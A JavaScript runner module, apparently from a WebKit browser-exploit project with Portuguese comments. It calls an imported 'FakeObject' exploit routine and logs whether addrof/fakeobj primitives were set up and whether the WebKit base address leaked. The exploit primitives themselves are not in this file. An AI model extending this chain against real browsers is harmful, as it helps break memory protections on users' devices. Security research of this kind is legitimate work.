// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisão 44 - Estratégia FakeObject)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

// [ESTRATÉGIA ATUALIZADA] Importando a nova função e a nova constante de nome do módulo.
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43 as executeFakeObjectStrategy, 
    FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK
} from './testArrayBufferVictimCrash.mjs';

// [ESTRATÉGIA ATUALIZADA] A função foi renomeada para refletir a nova abordagem.
async function runFakeObjectStrategy_R44() {
    const FNAME_RUNNER = "runFakeObjectStrategy_R44"; 
    logS3(`==== INICIANDO Estratégia com FakeObject (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    // A chamada para a função de teste principal.
    const result = await executeFakeObjectStrategy();

    const module_name_for_title = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;

    if (result.errorOccurred) {
        logS3(`  RUNNER R44: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
        return;
    } 
    
    if (result) {
        // [ESTRATÉGIA ATUALIZADA] Lógica de relatório completamente nova para o resultado do FakeObject.
        logS3(`  RUNNER R44: Teste principal concluído.`, "good", FNAME_RUNNER);
        
        const primitivesOK = result.primitives_initialized;
        const webkitLeakResult = result.webkit_leak_result;

        logS3(`  RUNNER R44: Bootstrap de Primitivas: ${primitivesOK ? "SUCESSO" : "FALHA"}`, primitivesOK ? "vuln" : "critical", FNAME_RUNNER);

        if (primitivesOK) {
            if (result.leaked_function_address) {
                logS3(`  RUNNER R44: Endereço da função vazado via 'addrof': ${result.leaked_function_address}`, "leak", FNAME_RUNNER);
            }

            if (webkitLeakResult) {
                logS3(`  RUNNER R44: Teste WebKit Base Leak: ${webkitLeakResult.msg}`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
                if (webkitLeakResult.success) {
                     logS3(`  RUNNER R44: -> Base do WebKit Candidata: ${webkitLeakResult.webkit_base_candidate}`, "vuln", FNAME_RUNNER);
                }
            } else {
                logS3(`  RUNNER R44: Teste WebKit Base Leak não produziu resultado.`, "warn", FNAME_RUNNER);
            }
        } else {
            logS3(`  RUNNER R44: Exploração abortada pois o bootstrap das primitivas falhou.`, "error", FNAME_RUNNER);
        }

        // Atualiza o título da página com o resultado final
        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}: WebKitLeak SUCCESS!`;
        } else if (primitivesOK) {
            document.title = `${module_name_for_title}: Bootstrap OK, Leak Fail`;
        } else {
            document.title = `${module_name_for_title}: Bootstrap Fail`;
        }

    } else {
        document.title = `${module_name_for_title}: Invalid Result Obj`;
        logS3(`  RUNNER R44: O objeto de resultado retornado pelo teste é inválido.`, "critical", FNAME_RUNNER);
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia com FakeObject (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R44 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    // [ESTRATÉGIA ATUALIZADA] Chama a nova função runner.
    await runFakeObjectStrategy_R44();
    
    logS3(`\n==== Script 3 R44 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK")) {
        document.title = `${FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK}_R44 Done`;
    }
}
